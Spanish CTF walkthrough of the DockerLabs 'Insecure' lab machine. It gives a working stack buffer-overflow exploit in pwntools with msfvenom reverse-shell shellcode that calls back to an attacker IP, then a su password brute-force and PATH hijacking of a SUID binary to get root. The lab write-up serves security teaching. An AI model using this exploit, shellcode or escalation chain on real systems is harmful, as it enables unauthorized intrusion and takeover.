![Screenshot](/hard/Insecure/Images/machine.png)

Dificultad: **difícil**

Creado por: **4bytes**

# Pasos para comprometer 🥽

* 👁️  [Reconocimiento](#reconocimiento)
* 🪓 [Explotación](#explotación)
* 🚩 [Escalada de privilegios](#escalada-de-privilegios)

---

## 🛠️ Técnicas: Analizar un binario compilado, explotar un BoF, fuerza bruta, reverse engineering con ltrace, manipulación de ruta

---

En primer lugar, nos aseguramos de que la máquina esté activa, lo cual podemos comprobar con el comando **ping**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.248 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.166 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.110 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2028ms
rtt min/avg/max/mdev = 0.110/0.174/0.248/0.056 ms
```

Ahora, podemos comenzar nuestra fase de **reconocimiento**.

---

# Reconocimiento

Siempre comenzamos con **nmap** para saber qué puertos están abiertos en la máquina objetivo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-07 11:49 -0500
Initiating ARP Ping Scan at 11:49
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 11:49, 0.13s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:49
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 20201/tcp on 172.17.0.2
Completed SYN Stealth Scan at 11:49, 3.20s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000026s latency).
Scanned at 2026-01-07 11:49:02 -05 for 4s
Not shown: 65533 closed tcp ports (reset)
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 64
20201/tcp open  unknown syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.70 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- Con este argumento le indicamos a nmap que escanee todos los puertos, desde el puerto 1 hasta el 65.535.

**-n** <- Con este argumento nmap omitirá la resolución DNS, lo cual es útil porque en algunos casos puede ralentizar el escaneo.

**-sS** <- Con este argumento nmap realizará un escaneo de tipo "stealth", es decir, no completará el handshake de tres vías, lo que hace que el escaneo sea más rápido y menos detectable.

**--min-rate 5000** <- Con este argumento nmap enviará al menos 5000 paquetes por segundo, acelerando aún más el escaneo.

**-Pn** <- Con este argumento nmap saltará la fase de descubrimiento de hosts, lo que significa que tratará a la máquina como activa y comenzará inmediatamente el escaneo.

**-vv** <- Con este argumento nmap mostrará los puertos descubiertos abiertos durante el escaneo, lo que permite ver los resultados en tiempo real.

**--open** <- Con este argumento solo filtraremos los puertos abiertos.

Una vez que el escaneo finalice, podemos ver que hay dos puertos abiertos:

- Puerto 80 (http / Hyper-Text Transfer Protocol)
- Puerto 20201 (???)

Para saber más sobre estos puertos, haremos otro escaneo con **nmap** para conocer los servicios y versiones que corren en estos puertos.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/enumeration]
└─$ nmap -p80,20201 -sCV 172.17.0.2 -oX target
```

**-p80,20201** <- Con este argumento nmap solo escaneará estos dos puertos descubiertos.

**-sCV** <- Con este argumento nmap escaneará la versión de cada puerto para detectar posibles vulnerabilidades en sistemas no actualizados, y también ejecutará scripts de nmap para obtener más información sobre estos puertos.

**-oX target** <- Con este argumento guardamos la salida que nmap genera en un archivo XML.

Después de que el escaneo finalice, obtenemos la salida en un archivo XML, lo hacemos para crear una página HTML y ver la información de forma más clara y legible.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/enumeration]
└─$ xsltproc target -o target.html
```

Con este comando convertimos el archivo XML a un archivo HTML. Ahora abrámoslo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/enumeration]
└─$ open target.html 
```

Y podemos verlo en nuestro navegador.

![Screenshot](/hard/Insecure/Images/image1.png)

Como podemos ver, es más bonito y legible a la vista.

Parece que el puerto 80 es un sitio web, así que usemos **whatweb** para saber más sobre las tecnologías que utiliza este sitio.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/enumeration]
└─$ whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[172.17.0.2], Title[software installation]
```

Podemos ver que utiliza **Apache**, pero no hay más información, así que echemos un vistazo con el navegador.

![Screenshot](/hard/Insecure/Images/image2.png)

Solo podemos ver esto, incluso con un poco de enumeración no encontramos nada interesante.

Así que descarguemos este archivo.

Podemos ver que es un archivo binario de 32 bits.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ file secure_software 
secure_software: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=1badf7bdd2ab6ae00b8c3b1f965fca6048d32478, for GNU/Linux 3.2.0, not stripped
```

Y es un **ejecutable**, pero antes de hacer algo con él, conectémonos a la máquina en el puerto **20201** con **netcat**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ nc 172.17.0.2 20201
Enter data: hello?
Data received correctly
```

Parece que solo recibe datos.

Así que ejecutemos nuestro ejecutable en nuestra propia máquina.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ ./secure_software 
Listening at 0.0.0.0:20201!
```

Parece que escucha en el mismo puerto.

Así que conectémonos una vez más pero en nuestro **localhost**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ nc localhost 20201
Enter data: yes123
Data received correctly
```

Podemos ver que es el mismo ejecutable que usa la máquina objetivo en el puerto 20201.

Bien, conectémonos una vez más y introduzcamos muchos datos para ver qué pasa.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ nc localhost 20201
Enter data: AAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```

Y podemos ver una falla de segmentación en el servidor.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ ./secure_software 
Listening at 0.0.0.0:20201!
Listening at 0.0.0.0:20201!
zsh: segmentation fault  ./secure_software
```

Parece que es vulnerable a un **BoF** (Buffer Overflow).

Así que usemos **GDB** (GNU Debugger) para analizar mejor qué ocurre cuando introducimos muchos datos.

---

# Explotación

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ gdb -q secure_software 
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.01ms using Python engine 3.13
Reading symbols from secure_software...
(No debugging symbols found in secure_software)
gef➤
```

Así que ejecutemos el binario simplemente con **r**.

```r
gef➤  r
Starting program: /home/craft/challenges/dockerlabs/dificil/insecure/files/secure_software 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
Listening at 0.0.0.0:20201!
```

Ahora conectémonos una vez más e introduzcamos muchos datos.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ nc localhost 20201
Enter data: AAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```

Y podemos ver esto en nuestro **gdb**:

![Screenshot](/hard/Insecure/Images/image3.png)

Podemos ver mucha información aquí, pero solo veamos los primeros datos, que son los registros, indicados con el color **rojo**.

Podemos ver que al introducir muchos datos en el buffer (que es como un espacio disponible de datos), sobrescribimos más registros como **EBP** y **EIP**.

Esto es peligroso porque podemos cambiar el flujo del programa que queremos.

Si no sabes qué es un **EIP** (Extended Instruction Pointer), básicamente le dice al programa qué instrucción debe ejecutar a continuación, es como una guía para el programa.

Y como podemos ver en la imagen, el valor de **EIP** es **AAAA** (0x41414141), para la computadora esta dirección es inválida, porque no existe una instrucción con esa dirección.

Así que si modificamos el valor de **EIP**, podemos cambiar el flujo del programa a donde queramos, y dirigir la ejecución del programa a otro lugar.

Bien, ahora veamos qué protecciones utiliza este binario con **checksec**.

```r
gef➤  checksec
[+] checksec for '/home/craft/challenges/dockerlabs/dificil/insecure/files/secure_software'
Canary : ✘
NX : ✘
PIE : ✘                    
Fortify : ✘                     
RelRO : Partial                         
gef➤
```

Podemos ver que el permiso de **NX** (Not Executable) está deshabilitado, lo que significa que podemos ejecutar comandos en el sistema.

Así que podemos introducir **shellcodes** en la pila para ejecutar comandos en el sistema.

Pero necesitamos el **offset** de **EIP**, que es como una ubicación de EIP antes de **sobrescribirlo**.

Podemos usar **patrones** para saber el número total de bytes antes de escribir en EIP.

Todas estas funciones que estoy usando son un plugin de GDB, que es **gef**, puedes verlo en github aquí [aquí](https://github.com/hugsy/gef)

Para obtener un **patrón**, solo necesitamos ejecutar el siguiente comando en gef: **pattern create**

```r
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaa...                 
[+] Saved as '$_gef0'
```

Bien, copiemos todo esto al portapapeles.

Luego ejecutemos el programa de nuevo para conectarnos y entrar todo esto.

Luego conectémonos una vez más con **netcat**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ nc localhost 20201
Enter data: aaaabaaacaaadaaaeaaaf...
```

Y podemos ver esto:

![Screenshot](/hard/Insecure/Images/image4.png)

Parece lo mismo pero con cadenas diferentes.

Y podemos obtener el offset de EIP con el siguiente comando:

**pattern offset $eip**

```r
gef➤  pattern offset $eip
[+] Searching for '7a616164'/'6461617a' with period=4
[+] Found at offset 300 (little-endian search) likely
```

Y encontramos el offset de EIP que es **300**, para verificarlo podemos hacer una cadena de caracteres de 300 bytes y agregar **BBBB** para ver si podemos sobrescribir el EIP con estos caracteres.

```r
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```

Luego ejecutemos el programa de nuevo y conectémonos para introducir esta cadena.

![Screenshot](/hard/Insecure/Images/image5.png)

Podemos ver que encontramos el offset de EIP es igual a 300, y su valor es BBBB, también podemos ver que **ESP** (Extended Stack Pointer) está siendo sobrescrito con muchos Cs.

**ESP** es otro registro que apunta a la parte superior de la pila (el elemento más recientemente empujado), así que podemos intentar saber dónde está ubicado **ESP** con **objdump** en el binario.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ objdump -d secure_software | grep jmp | grep esp
 8049213:       ff e4                   jmp    *%esp
```

Encontramos la ubicación de esta instrucción que es: **8049213** (0x8049213)

Y para la instrucción **jmp esp**, esto hace que el **CPU** **salte** a la dirección de memoria de **ESP**, esto es muy importante saber para ejecutar comandos correctamente.

Así que después de hacer todo esto, podemos hacer un exploit, y usar **pwntools**.

Para generar el **shellcode** y hacer una reverse shell, podemos usar **msfvenom**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/exploits]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.20 LPORT=1234 -f c 
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd"
"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x00"
"\x14\x68\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50\x51\x53\xb3"
"\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
"\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
```

Toda esta cadena es el **shellcode**.

Así que aquí está el exploit hecho con python.

```python
from pwn import *

target = "172.17.0.2"
port = 20201

def send_data():
    connect = remote(target, port)

    eip_offset = 300

    # 8049213

    esp = b"\x13\x92\x04\x08"

    payload = b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd"
    payload += b"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x00"
    payload += b"\x14\x68\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50\x51\x53\xb3"
    payload += b"\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
    payload += b"\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

    trash = b"A"*eip_offset + esp + payload

    connect.sendafter(b"Enter data: ", trash)

    connect.close()

if __name__ == "__main__":
    send_data()
```

La dirección de ESP debe estar en reversa, porque la arquitectura de este binario es **little-endian**

Así que aquí hay un ejemplo de cómo funciona el exploit con **excalidraw**

![Screenshot](/hard/Insecure/Images/image6es.png)

Bien, ahora ejecutemos el script para obtener una reverse shell, pero primero pongámonos en modo escucha con **netcat** para recibir la shell desde nuestra máquina de ataque.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/exploits]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

**-l** <- Este argumento hace que netcat esté en modo escucha.

**-v** <- Este argumento activa el modo **verbose**, lo que nos mostrará en más detalle la conexión que recibimos.

**-n** <- Esto hace que netcat omita la búsqueda DNS, y solo use la dirección IP directamente.

**-p** <- El puerto en el que estamos escuchando, puede ser cualquiera, si no está siendo usado actualmente.

Genial, ahora ejecutemos el **exploit**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/exploits]
└─$ python3 exploit.py 
[+] Opening connection to 172.17.0.2 on port 20201: Done
[*] Closed connection to 172.17.0.2 port 20201
```

Vemos esto pero con **netcat** podemos ver esto:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/exploits]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.0.20] from (UNKNOWN) [172.17.0.2] 47296
whoami
securedev
```

Genial, así que modifiquemos esta shell para que sea más cómoda.

En primer lugar, hagamos esto:

```d
securedev@34104cab34e5:/home/securedev$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

Este comando crea una nueva sesión de bash con **script** y **/dev/null** como archivo de salida, porque script registra cada comando que ejecutamos en un registro, pero con la ruta de /dev/null, hacemos que ese registro no pueda grabar comandos, y **-c bash** hace que script ejecute la shell con bash.

Lo hacemos porque queremos usar CTRL + C y más funciones de bash.

Cuando ejecutamos esto, suspendemos temporalmente nuestra reverse shell.

Luego ejecutamos el siguiente comando en nuestra máquina de ataque:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/exploits]
└─$ stty raw -echo; fg
```

Este comando hace que stty trate la terminal.

**raw** <- Con raw estamos haciendo que todos los datos de entrada y salida sean crudos.

**-echo** <- Con esto estamos haciendo que si ejecutamos un comando no se imprima de nuevo en la salida.

**; fg** <- Y con esto reanudamos nuestra reverse shell.

Cuando ejecutamos este comando, reseteamos el xterm:

```r
reset xterm
```

Esto va a resetear la terminal.

Si queremos limpiar nuestra terminal, no podemos porque la terminal será diferente a la de xterm, que tiene esta función. Podemos hacerlo de la siguiente manera para poder limpiar nuestra pantalla si se pone feo:

```r
securedev@34104cab34e5:/home/securedev$ export TERM=xterm
```

Y una última cosa, si notamos que la pantalla de la terminal es muy pequeña.

Podemos ajustarla para que sea más grande con el siguiente comando:

```r
securedev@34104cab34e5:/home/securedev$ stty rows {num} columns {num}
```

Y finalmente se ve mucho mejor!

---

# Escalada de privilegios

En nuestro directorio home podemos encontrar esto:

```d
securedev@34104cab34e5:/home/securedev$ cat hashfile 
This is for you, john the ripper:

21571b31a8d2e8b03690989835872cc6
```

Encontramos este hash, parece ser en **MD5**, podemos usar **john** para hacer fuerza bruta o incluso con **crackstation**

Pero esto es inútil porque este hash parece **irrompible**.

Podemos intentar encontrar posibles archivos que el usuario **johntheripper** posea.

```r
securedev@34104cab34e5:/home/securedev$ find / -user johntheripper 2>/dev/null | grep -v proc
/opt/.hidden/words
/home/johntheripper
```

Así que encontramos algo interesante en el primer archivo.

```r
securedev@34104cab34e5:~$ cat /opt/.hidden/words
I love these words:

test123test333
333300trest
trest00aa20_
_23t_32_g4
testnefg321ttt
trestre2612t33s
11tv1e0st!!!!!
!!10t3bst??
tset0tevst!
ts!tse?test01
_0test!X!test0
0143_t3s5t53_0
```

Parece ser una lista de contraseñas, tal vez del usuario **johntheripper**, así que voy a usar **suForce** para hacer un ataque de fuerza bruta con esta lista.

Puedo intentar hacer que el script esté en **base64** y decodificarlo en la máquina objetivo:

```r
┌──(craft㉿kali)-[~/hacks/suForce]
└─$ cat suForce | base64 | tr -d '\n' | xclip -sel clip
```

Y todo el formato se copia en mi portapapeles, ahora decodifiquemoslo en la máquina objetivo.

```r
securedev@34104cab34e5:~$ echo "IyEvYmluL2Jhc2gKCnJlYWRvbmx5IFJFRD0iXGVbOTFtIgpy...K" | base64 -d > suForce
```

Bien, usemos **suForce** con la lista de contraseñas.

```r
securedev@34104cab34e5:~$ bash suForce -u johntheripper -w /opt/.hidden/words
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | johntheripper
📖 Wordlist | /opt/.hidden/words
🔎 Status   | 11/14/78%/tset0tevst!
💥 Password | tset0tevst!
───────────────────────────────────
```

La contraseña es: **tset0tevst!**

```r
securedev@34104cab34e5:~$ su johntheripper
Password: 
johntheripper@34104cab34e5:/home/securedev$ whoami
johntheripper
```

Bien, ahora podemos buscar posibles archivos con permisos **SUID** con **find**

```r
johntheripper@34104cab34e5:~$ find / -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/mount
/usr/bin/gpasswd
/usr/sbin/exim4
/home/johntheripper/show_files
```

Encontramos un archivo **show_files** que está en el directorio home actual.

Ejecutémoslo y veamos qué pasa.

```r
johntheripper@34104cab34e5:~$ ./show_files 
show_files
```

Parece que solo muestra archivos en el directorio actual, así que transferiremos este archivo a nuestra máquina de ataque, podemos usar **python3** para transferir archivos.

```r
johntheripper@34104cab34e5:~$ python3 -m http.server 100
Serving HTTP on 0.0.0.0 port 100 (http://0.0.0.0:100/) ..
```

Podemos usar **wget** para transferir el archivo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ wget http://172.17.0.2:100/show_files
--2026-01-07 16:09:35--  http://172.17.0.2:100/show_files
Connecting to 172.17.0.2:100... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16064 (16K) [application/octet-stream]
Saving to: 'show_files'

show_files                                                  100%[=================================>]  15.69K  --.-KB/s    in 0s      

2026-01-07 16:09:35 (475 MB/s) - 'show_files' saved [16064/16064]
```

Podemos ver la ejecución del programa con **ltrace**, así que hagámoslo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/insecure/files]
└─$ ltrace ./show_files
setuid(0)                                                       = -1
setgid(0)                                                       = -1
system("ls"secure_software  show_files
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                          = 0
+++ exited (status 0) +++
```

Podemos ver que el **uid** cambia a 0 (**root**) y también el **gid** (0) (**root**) y ejecuta el comando **ls**

Pero esto es vulnerable a una **manipulación de ruta** porque el comando **ls** no está definido con la ruta completa del binario.

Así que en la máquina objetivo, vamos a crear un archivo con el mismo nombre que **ls**

```r
johntheripper@34104cab34e5:~$ echo -e '#!/bin/bash\nbash' > ls
```

Genial, ahora démosle permisos de ejecución:

```r
johntheripper@34104cab34e5:~$ chmod +x ls
```

Así que luego cambiaremos el PATH del sistema.

```r
johntheripper@34104cab34e5:~$ export PATH=/home/johntheripper:$PATH
```

Bien, así que cuando el comando **show_files** se ejecute, el usuario **root** va a ejecutar el comando **ls** desde la ruta actual que el comando "ls" va a ejecutar una bash/shell y obtener una shell como el usuario **root**.

Así que ejecutémoslo entonces.

```r
johntheripper@152b866c1aea:~$ export PATH=/home/johntheripper:$PATH
johntheripper@152b866c1aea:~$ ./show_files 
root@152b866c1aea:~# whoami
root
```

Ahora somos root ***...pwned..!***
